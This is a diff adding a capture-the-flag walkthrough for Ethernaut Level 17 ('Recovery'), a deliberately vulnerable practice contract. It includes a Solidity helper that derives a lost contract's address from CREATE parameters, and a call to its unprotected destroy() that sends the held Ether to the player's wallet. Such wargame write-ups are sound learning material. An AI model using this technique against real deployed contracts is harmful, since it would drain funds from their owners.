@@ -956,3 +956,71 @@ await contract.owner()
 
 ## Level Completed
 ![Level Complete Output](assets/level16-preservation-success.png)
+
+
+# Ethernaut Level 17: Recovery
+
+## Strategy
+
+- **Vulnerability**: The `Recovery` contract deploys `SimpleToken` contracts using the `new` keyword. These contracts store Ether and have a public `destroy()` method that calls `selfdestruct()`, allowing anyone to remove the Ether.
+- **Exploit**: 
+  - Since the token contract was created as the first child of the `Recovery` contract, we can calculate its address deterministically using `CREATE` address derivation.
+  - Once we recover the address, we call its `destroy()` method and pass our own wallet to drain the Ether.
+
+---
+
+## Remix Deployment Steps
+
+### 1. Deploy the helper `Dev` contract in Remix
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Dev {
+    function recover(address sender) external pure returns (address) {
+        // Derive contract address using keccak256 of the RLP encoding
+        return address(uint160(uint256(keccak256(abi.encodePacked(
+            bytes1(0xd6),
+            bytes1(0x94),
+            sender,
+            bytes1(0x01) // nonce = 1 for the first contract created
+        )))));
+    }
+}
+```
+
+This contract calculates the lost token contract address using Ethereum's `CREATE` address derivation method.
+
+---
+
+### 2. Call `recover()` with the address of the `Recovery` contract
+
+```
+dev.recover("0xRecoveryContractAddress")
+```
+
+Get the address of the `SimpleToken` that was deployed via the `Recovery` contract.
+
+---
+
+### 3. Interact with the recovered token address in Remix
+
+Load the `SimpleToken` contract using the recovered address and call:
+
+```
+destroy(payable("yourWalletAddress"))
+```
+
+Triggers `selfdestruct()` to send the 0.001 ETH to your wallet.
+
+---
+
+### Success Check
+
+After calling `destroy()`, check your wallet balance or ensure the contract no longer holds ETH.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/level17-recovery-success.png)
